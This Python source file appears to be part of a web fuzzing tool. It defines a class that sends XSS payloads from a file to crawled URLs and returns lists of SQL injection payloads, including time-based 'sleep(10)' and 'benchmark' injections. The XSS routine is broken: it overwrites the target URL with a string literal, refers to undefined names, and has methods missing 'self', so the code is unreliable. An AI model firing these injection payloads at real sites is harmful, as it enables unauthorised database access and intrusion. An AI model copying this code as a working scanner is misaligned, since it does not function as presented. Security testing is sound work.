from _typeshed import SupportsItemAccess
from urllib.parse import parse_qs, unquote, urlparse, urljoin, urlencode
from .Crawler import Crawler, DATABASE, sessions, var, request
from bs4 import BeautifulSoup
from threading import Thread
from base64 import b64decode
import tldextract
import selenium 
from urllib.error import URLError, HTTPError

class Fuzzing:
    def __init__(self, URL, Page = False, db = {}, **REQUEST_INFO) -> None:
        self.tags = var.tags
        self.Page = Page
        self.URLists = set()
        self.FirstURL = urlparse(URL)
        self.LatestURL = self.URL = URL
        REQUEST_INFO.setdefault('timeout', var.TIMEOUT)
        REQUEST_INFO.setdefault('headers', var.USER_AGENT)
        if db:
            self.conn = DATABASE(host = db['HOST'], port = db['PORT'], user = db['USER'], passwd = db['PASSWORD'], db = db['DB'])

        self.table = tldextract.extract(URL).domain

        self.REQUEST_INFO = REQUEST_INFO
        self.URLJOIN = (lambda TMPURL: urljoin(self.URL, TMPURL) if TMPURL else None)
        
        if Page:
            self.REQUESTS = sessions(URL, **REQUEST_INFO)
            self.TMP_REQUEST = self.REQUESTS.webdriver()
        else:
            self.REQUESTS = sessions(URL, **REQUEST_INFO)
            self.TMP_REQUEST = self.REQUESTS.sess_get()

    def URL(self):
        self.conn.URL_SELECT(TABLE_NAME=self.table)

    def xss(self):
        file = open("webfuzzing/payloads/xss/payloads.txt", "r")
        
        
        for i in self.conn.URL_SELECT(TABLE_NAME=self.table):
                    URL='last_url'

        while True:
            pay = file.readline()
            URL=URL.request(pay)

            URL= request.urlopen(URL)

            if request.method == 'GET':
                try:
                    exploit=request.get(URL,pay)
                except HTTPError: 
                    break
            
                if not pay:
                    break
            else : #request.method == 'POST':
                try:
                    exploit=request.post(URL,pay)
                except HTTPError: 
                    break
            
                if not pay:
                    break
        file.close()

        return URL,URL.status,parameter,pay

    def openredirect():
        payloads = [
            ''
        ]

        return payloads

    def simple_sqli():
        payloads = [
            '\'',
            '"',
            '0',
            '0\'',
            '0"',
        ]

        return payloads

    def sleep_sqli():
        payloads = [
            '\' or sleep(10) -- \'',
            '" or sleep(10) -- "',
            '0 or sleep(10) -- ',
            '\' or sleep(10) #\'',
            '" or sleep(10) #"',
            '0 or sleep(10) #',
            '\' or benchmark(7380000000*10,md5(1)) -- \'',
            '" or benchmark(7380000000*10,md5(1)) -- "',
            '0 or benchmark(7380000000*10,md5(1)) -- ',
            '\' or benchmark(7380000000*10,md5(1)) #\'',
            '" or benchmark(7380000000*10,md5(1)) #"',
            '0 or benchmark(7380000000*10,md5(1)) #',
        ]

        return payloads